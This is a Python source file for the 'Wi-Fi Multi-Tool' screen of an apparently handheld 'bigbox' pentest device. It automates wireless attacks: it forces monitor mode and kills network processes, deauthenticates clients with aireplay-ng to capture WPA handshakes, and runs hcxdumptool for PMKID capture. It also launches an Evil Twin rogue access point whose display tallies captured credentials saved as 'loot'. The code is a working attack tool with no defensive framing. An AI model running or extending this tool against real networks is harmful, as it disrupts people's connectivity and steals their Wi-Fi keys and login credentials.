"""Wi-Fi Multi-Tool — Scanner, Handshake/PMKID capture, and Evil Twin.
"""
from __future__ import annotations

import csv
import os
import re
import signal
import subprocess
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import TYPE_CHECKING

import pygame

from bigbox import theme
from bigbox import eviltwin as et
from bigbox.events import Button, ButtonEvent
from bigbox.ui.section import SectionContext
from bigbox.ui.wifi_attack import AP, Client, _list_wlan_ifaces, _read_airodump_csv

if TYPE_CHECKING:
    from bigbox.app import App

PHASE_PICK_IFACE = "iface"
PHASE_ENABLING = "enabling"
PHASE_SCAN_APS = "scan"
PHASE_SELECT_ATTACK = "select_attack"
PHASE_ATTACK_HANDSHAKE = "attack_handshake"
PHASE_ATTACK_PMKID = "attack_pmkid"
PHASE_ATTACK_EVIL_TWIN = "attack_evil_twin"
PHASE_CONFIRM = "confirm"

class WifiMultiToolView:
    LOOT_DIR = Path("loot/wifi")

    def __init__(self) -> None:
        self.dismissed = False
        self.phase = PHASE_PICK_IFACE
        self.status_msg = "Select monitor-capable adapter"

        self.ifaces = _list_wlan_ifaces()
        self.iface_cursor = 0
        self.mon_iface: str | None = None
        self.original_iface: str | None = None

        self.aps: list[AP] = []
        self.ap_cursor = 0
        self.ap_scroll = 0
        self.targeted_ap: AP | None = None
        
        self.attack_options = [
            ("WPA Handshake", "Capture 4-way handshake via deauth"),
            ("PMKID Capture", "Clientless capture (hcxdumptool)"),
            ("Evil Twin", "Create rogue AP with portal (dnsmasq)"),
        ]
        self.attack_cursor = 0

        # Attack specific state
        self.handshake_captured = False
        self.pmkid_captured = False
        self.deauth_count = 0
        self.clients: list[Client] = []
        self.client_cursor = 0
        
        self._airodump: subprocess.Popen | None = None
        self._hcxdumptool: subprocess.Popen | None = None
        self._dnsmasq: subprocess.Popen | None = None
        self._hostapd: subprocess.Popen | None = None
        
        self.et_session: et.EvilTwinSession | None = None
        self._stop = False
        self._threads: list[threading.Thread] = []

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return

        if self.phase == PHASE_PICK_IFACE:
            if ev.button is Button.B: self.dismissed = True
            elif not self.ifaces: return
            elif ev.button is Button.UP: self.iface_cursor = (self.iface_cursor - 1) % len(self.ifaces)
            elif ev.button is Button.DOWN: self.iface_cursor = (self.iface_cursor + 1) % len(self.ifaces)
            elif ev.button is Button.A:
                pick = self.ifaces[self.iface_cursor]
                threading.Thread(target=self._enable_and_scan, args=(pick.name,), daemon=True).start()
            return

        if self.phase == PHASE_SCAN_APS:
            if ev.button is Button.B: self._cleanup_and_exit()
            elif not self.aps: return
            elif ev.button is Button.UP:
                self.ap_cursor = (self.ap_cursor - 1) % len(self.aps)
                self._adjust_scroll()
            elif ev.button is Button.DOWN:
                self.ap_cursor = (self.ap_cursor + 1) % len(self.aps)
                self._adjust_scroll()
            elif ev.button is Button.A:
                self.targeted_ap = self.aps[self.ap_cursor]
                self.phase = PHASE_SELECT_ATTACK
                self._stop_procs()
            return

        if self.phase == PHASE_SELECT_ATTACK:
            if ev.button is Button.B:
                self.phase = PHASE_SCAN_APS
                self._start_scan()
            elif ev.button is Button.UP: self.attack_cursor = (self.attack_cursor - 1) % len(self.attack_options)
            elif ev.button is Button.DOWN: self.attack_cursor = (self.attack_cursor + 1) % len(self.attack_options)
            elif ev.button is Button.A:
                self._start_attack_phase()
            return

        if self.phase in (PHASE_ATTACK_HANDSHAKE, PHASE_ATTACK_PMKID, PHASE_ATTACK_EVIL_TWIN):
            if ev.button is Button.B:
                self._stop_procs()
                self.phase = PHASE_SELECT_ATTACK
            elif self.phase == PHASE_ATTACK_HANDSHAKE:
                if ev.button is Button.X: self._do_deauth()
                elif ev.button is Button.UP: self.client_cursor = (self.client_cursor - 1) % (len(self.clients) + 1)
                elif ev.button is Button.DOWN: self.client_cursor = (self.client_cursor + 1) % (len(self.clients) + 1)
            return

    def _start_attack_phase(self) -> None:
        choice = self.attack_options[self.attack_cursor][0]
        if choice == "WPA Handshake":
            self.phase = PHASE_ATTACK_HANDSHAKE
            self.handshake_captured = False
            self.deauth_count = 0
            self._start_airodump_target()
        elif choice == "PMKID Capture":
            self.phase = PHASE_ATTACK_PMKID
            self.pmkid_captured = False
            self._start_pmkid()
        elif choice == "Evil Twin":
            self.phase = PHASE_ATTACK_EVIL_TWIN
            self._start_evil_twin()

    # --- Attack Logic ---

    def _start_scan(self) -> None:
        self._stop_procs()
        self.LOOT_DIR.mkdir(parents=True, exist_ok=True)
        # Use an absolute path for prefix to be safe
        ts = datetime.now().strftime("%H%M%S")
        prefix = (Path("/opt/bigbox") / self.LOOT_DIR / f"scan_{ts}").absolute()
        self._capture_csv_path = Path(str(prefix) + "-01.csv")
        
        print(f"[wifi] Starting scan: {prefix}")
        self._airodump = subprocess.Popen(
            ["airodump-ng", "--output-format", "csv", "-w", str(prefix), self.mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid
        )
        self._start_poll_thread()

    def _start_airodump_target(self) -> None:
        ap = self.targeted_ap
        ts = datetime.now().strftime("%H%M%S")
        prefix = (Path("/opt/bigbox") / self.LOOT_DIR / f"handshake_{ap.essid or 'hidden'}_{ts}").absolute()
        self._capture_csv_path = Path(str(prefix) + "-01.csv")
        self._airodump = subprocess.Popen(
            ["airodump-ng", "-c", ap.channel, "--bssid", ap.bssid, "--output-format", "csv,pcap", "-w", str(prefix), self.mon_iface],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, preexec_fn=os.setsid
        )
        
        def watch_handshake():
            for line in self._airodump.stdout:
                if "WPA handshake" in line:
                    self.handshake_captured = True
                    self.status_msg = "HANDSHAKE CAPTURED!"
        threading.Thread(target=watch_handshake, daemon=True).start()
        self._start_poll_thread()

    def _start_pmkid(self) -> None:
        ap = self.targeted_ap
        out_file = self.LOOT_DIR / f"pmkid_{ap.essid or 'hidden'}.pcapng"
        self.status_msg = f"hcxdumptool running on ch {ap.channel}..."
        # hcxdumptool -i <iface> -c <chan> --filter_list=<bssid_file> -o <out>
        # For simplicity, we'll use a broad scan or a filter if we have it
        try:
            self._hcxdumptool = subprocess.Popen(
                ["hcxdumptool", "-i", self.mon_iface, "-o", str(out_file), "--enable_status=1"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
            )
            def watch_pmkid():
                for line in self._hcxdumptool.stdout:
                    if "PMKID" in line:
                        self.pmkid_captured = True
                        self.status_msg = "PMKID CAPTURED!"
            threading.Thread(target=watch_pmkid, daemon=True).start()
        except FileNotFoundError:
            self.status_msg = "hcxdumptool not found"

    def _start_evil_twin(self) -> None:
        self.status_msg = "Evil Twin: Restoring managed mode..."
        # Evil Twin needs the interface in managed mode (et.py handles nmcli)
        if self.mon_iface:
            subprocess.run(["airmon-ng", "stop", self.mon_iface], stdout=subprocess.DEVNULL)
        
        ap = self.targeted_ap
        self.et_session = et.EvilTwinSession(
            iface=self.original_iface,
            ssid=ap.essid or "Free WiFi",
            channel=int(ap.channel) if ap.channel.isdigit() else 6
        )
        
        def _worker():
            ok, msg = self.et_session.start()
            if ok:
                self.status_msg = "Evil Twin AP Active"
            else:
                self.status_msg = f"ET Error: {msg}"
        
        threading.Thread(target=_worker, daemon=True).start()

    def _do_deauth(self) -> None:
        if not self.mon_iface or not self.targeted_ap: return
        cmd = ["aireplay-ng", "--deauth", "5", "-a", self.targeted_ap.bssid]
        if self.client_cursor > 0:
            cmd += ["-c", self.clients[self.client_cursor - 1].mac]
        cmd.append(self.mon_iface)
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.deauth_count += 1

    # --- Lifecycle ---

    def _enable_and_scan(self, iface: str) -> None:
        self.original_iface = iface
        self.phase = PHASE_ENABLING
        self.status_msg = f"Enabling monitor on {iface}..."
        
        # Kill interfering processes
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Enable monitor mode
        subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait a bit for interface to settle and find the actual monitor interface name
        time.sleep(2)
        found_mon = None
        for it in _list_wlan_ifaces():
            if it.is_monitor:
                found_mon = it.name
                break
        
        # Fallback: if no monitor interface found, try the original name + 'mon' 
        # or just the original name if airmon-ng didn't rename it.
        if not found_mon:
            if os.path.exists(f"/sys/class/net/{iface}mon"):
                found_mon = f"{iface}mon"
            else:
                found_mon = iface

        self.mon_iface = found_mon
        self.phase = PHASE_SCAN_APS
        self.status_msg = f"Scanning on {self.mon_iface}..."
        self._start_scan()

    def _stop_procs(self) -> None:
        self._stop = True
        if self.et_session:
            self.et_session.stop()
            self.et_session = None
            
        for p in [self._airodump, self._hcxdumptool, self._dnsmasq, self._hostapd]:
            if p and p.poll() is None:
                try: os.killpg(os.getpgid(p.pid), signal.SIGINT)
                except: p.terminate()
        self._airodump = self._hcxdumptool = self._dnsmasq = self._hostapd = None

    def _cleanup_and_exit(self) -> None:
        self.status_msg = "Cleaning up..."
        self._stop_procs()
        if self.mon_iface: 
            subprocess.run(["airmon-ng", "stop", self.mon_iface], stdout=subprocess.DEVNULL)
        
        # Ensure managed mode is restored for the original interface
        if self.original_iface:
            subprocess.run(["nmcli", "device", "set", self.original_iface, "managed", "yes"], stdout=subprocess.DEVNULL)
            subprocess.run(["nmcli", "networking", "on"], stdout=subprocess.DEVNULL)
            subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL)
            
        self.dismissed = True

    def _start_poll_thread(self) -> None:
        self._stop = False
        def poll():
            while not self._stop:
                if hasattr(self, '_capture_csv_path') and self._capture_csv_path.exists():
                    aps, clients = _read_airodump_csv(self._capture_csv_path)
                    if aps: self.aps = sorted(aps, key=lambda a: a.power, reverse=True)
                    if self.targeted_ap:
                        self.clients = [c for c in clients if c.bssid.upper() == self.targeted_ap.bssid.upper()]
                time.sleep(2)
        threading.Thread(target=poll, daemon=True).start()

    def _adjust_scroll(self) -> None:
        visible = 8
        if self.ap_cursor < self.ap_scroll: self.ap_scroll = self.ap_cursor
        elif self.ap_cursor >= self.ap_scroll + visible: self.ap_scroll = self.ap_cursor - visible + 1

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        head_h = 44
        pygame.draw.rect(surf, theme.BG_ALT, (0, 0, theme.SCREEN_W, head_h))
        pygame.draw.line(surf, theme.ACCENT, (0, head_h - 1), (theme.SCREEN_W, head_h - 1), 2)
        
        title_font = pygame.font.Font(None, 32)
        surf.blit(title_font.render("WIFI MULTI-TOOL", True, theme.ACCENT), (theme.PADDING, 8))
        
        status_font = pygame.font.Font(None, 20)
        surf.blit(status_font.render(self.status_msg, True, theme.FG_DIM), (theme.PADDING, theme.SCREEN_H - 25))

        if self.phase == PHASE_PICK_IFACE:
            self._render_list(surf, "Select Interface", [i.name for i in self.ifaces], self.iface_cursor, head_h)
        elif self.phase == PHASE_SCAN_APS:
            self._render_aps(surf, head_h)
        elif self.phase == PHASE_SELECT_ATTACK:
            self._render_list(surf, f"Target: {self.targeted_ap.display}", [f"{o[0]}: {o[1]}" for o in self.attack_options], self.attack_cursor, head_h)
        elif self.phase == PHASE_ATTACK_HANDSHAKE:
            self._render_handshake(surf, head_h)
        elif self.phase == PHASE_ATTACK_PMKID:
            self._render_pmkid(surf, head_h)
        elif self.phase == PHASE_ATTACK_EVIL_TWIN:
            self._render_evil_twin(surf, head_h)

    def _render_evil_twin(self, surf: pygame.Surface, head_h: int) -> None:
        sess = self.et_session
        if not sess:
            return
            
        f_huge = pygame.font.Font(None, 80)
        f_med = pygame.font.Font(None, 26)
        f_small = pygame.font.Font(None, 20)
        
        # SSID banner
        banner = f_med.render(f"ROGUE AP: {sess.ssid} (ch{sess.channel})", True, theme.ACCENT)
        surf.blit(banner, (20, head_h + 20))
        
        # Stats
        col_w = theme.SCREEN_W // 2
        cy = head_h + 80
        
        # Clients
        n_clients = sess.clients_connected()
        c_surf = f_huge.render(str(n_clients), True, theme.FG)
        surf.blit(c_surf, (col_w // 2 - c_surf.get_width() // 2, cy))
        cl_surf = f_med.render("CLIENTS", True, theme.FG_DIM)
        surf.blit(cl_surf, (col_w // 2 - cl_surf.get_width() // 2, cy + 70))
        
        # Creds
        n_creds = sess.creds_captured()
        cr_surf = f_huge.render(str(n_creds), True, theme.WARN)
        surf.blit(cr_surf, (col_w + col_w // 2 - cr_surf.get_width() // 2, cy))
        crl_surf = f_med.render("CREDS", True, theme.FG_DIM)
        surf.blit(crl_surf, (col_w + col_w // 2 - crl_surf.get_width() // 2, cy + 70))
        
        # Info
        y = head_h + 180
        surf.blit(f_small.render(f"Interface: {sess.iface}", True, theme.FG_DIM), (40, y))
        surf.blit(f_small.render(f"Gateway:   192.168.45.1", True, theme.FG_DIM), (40, y + 22))
        surf.blit(f_small.render(f"Loot:      loot/captive/", True, theme.FG_DIM), (40, y + 44))
        
        if not sess.is_running():
            err = f_med.render("AP ENGINE HALTED", True, theme.ERR)
            surf.blit(err, (theme.SCREEN_W // 2 - err.get_width() // 2, theme.SCREEN_H - 80))

    def _render_list(self, surf: pygame.Surface, title: str, items: list[str], cursor: int, head_h: int) -> None:
        f = pygame.font.Font(None, 28)
        surf.blit(f.render(title, True, theme.FG), (theme.PADDING, head_h + 20))
        for i, item in enumerate(items):
            sel = i == cursor
            color = theme.ACCENT if sel else theme.FG
            text = f.render(f"{'> ' if sel else '  '}{item}", True, color)
            surf.blit(text, (theme.PADDING + 20, head_h + 60 + i * 35))

    def _render_aps(self, surf: pygame.Surface, head_h: int) -> None:
        f = pygame.font.Font(None, 24)
        for i in range(10):
            idx = self.ap_scroll + i
            if idx >= len(self.aps): break
            ap = self.aps[idx]
            sel = idx == self.ap_cursor
            color = theme.ACCENT if sel else theme.FG
            pygame.draw.rect(surf, theme.BG_ALT if sel else theme.BG, (0, head_h + 10 + i * 38, theme.SCREEN_W, 36))
            surf.blit(f.render(f"{ap.essid or '<hidden>'} ({ap.bssid})", True, color), (20, head_h + 15 + i * 38))
            surf.blit(f.render(f"CH {ap.channel}  {ap.power}dBm", True, theme.FG_DIM), (theme.SCREEN_W - 180, head_h + 15 + i * 38))

    def _render_handshake(self, surf: pygame.Surface, head_h: int) -> None:
        f = pygame.font.Font(None, 26)
        surf.blit(f.render(f"TARGET: {self.targeted_ap.display}", True, theme.ACCENT), (20, head_h + 20))
        surf.blit(f.render(f"Captured: {self.handshake_captured}", True, theme.FG), (20, head_h + 50))
        surf.blit(f.render(f"Deauths: {self.deauth_count}", True, theme.FG), (20, head_h + 80))
        surf.blit(f.render("X: Send Deauth  B: Back", True, theme.FG_DIM), (20, head_h + 120))

    def _render_pmkid(self, surf: pygame.Surface, head_h: int) -> None:
        f = pygame.font.Font(None, 26)
        surf.blit(f.render(f"PMKID CAPTURE: {self.targeted_ap.display}", True, theme.ACCENT), (20, head_h + 20))
        status = "CAPTURED!" if self.pmkid_captured else "Running..."
        surf.blit(f.render(status, True, theme.ACCENT if self.pmkid_captured else theme.WARN), (20, head_h + 60))
        surf.blit(f.render("This may take a few minutes...", True, theme.FG_DIM), (20, head_h + 100))
